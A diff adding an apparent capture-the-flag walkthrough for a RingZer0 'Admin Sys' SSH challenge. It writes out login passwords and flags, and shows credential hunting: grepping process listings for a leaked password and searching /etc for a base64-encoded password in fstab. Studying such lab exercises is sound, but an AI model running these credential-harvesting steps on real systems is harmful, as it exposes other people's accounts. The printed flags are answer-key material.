@@ -1,0 +1,42 @@
+#Challenge Admin Sys
+
+#part1 find Trinity Password
+#login to SSH (ur port and password can change)
+
+ssh morpheus@challenges.ringzer0team.com -p 10089
+Password = VNZDDLq2x9qXCzVdABbR1HOtz 
+
+#To find the Flag U need to use the commands 
+ps aux | grep '[fF][lL][aA][gG]'
+
+#U will find something like this : 
+root         411  0.0  0.0   2608   840 ?        S    Apr11   0:39 /bin/sh /root/backup.sh -u trinity -p Flag-7e0cfcf090a2fe53c97ea3edd3883d0d 
+#U got the first flag and the password of Trinity
+
+#Part2 find Architect Password
+
+#U need to use to use the previous flag to connect to the account Trinity
+
+ssh trinity@challenges.ringzer0team.com -p 10089
+Password = Flag-7e0cfcf090a2fe53c97ea3edd3883d0d
+
+#got the repository etc because the /etc directory contains system configuration information
+cd /etc
+#use grep
+/etc$ grep -r "architect"
+#U got something like that 
+
+grep: skel: Permission denied
+fstab:#//TheMAtrix/phone  /media/Matrix  cifs  username=architect,password=$(base64 -d "RkxBRy0yMzJmOTliNDE3OGJkYzdmZWY3ZWIxZjBmNzg4MzFmOQ=="),iocharset=utf8,sec=ntlm  0  0
+grep: sudoers.d: Permission denied
+grep: .pwd.lock: Permission denied
+
+#U found the password encoded in base64, U need to decode it
+echo "RkxBRy0yMzJmOTliNDE3OGJkYzdmZWY3ZWIxZjBmNzg4MzFmOQ==" |base64 -d
+FLAG-232f99b4178bdc7fef7eb1f0f78831f9 #2nd Flag and password of Architect
+
+#Part3
+
+#Connect to the account Architect
+ssh architect@challenges.ringzer0team.com -p 10089
+Password = FLAG-232f99b4178bdc7fef7eb1f0f78831f9
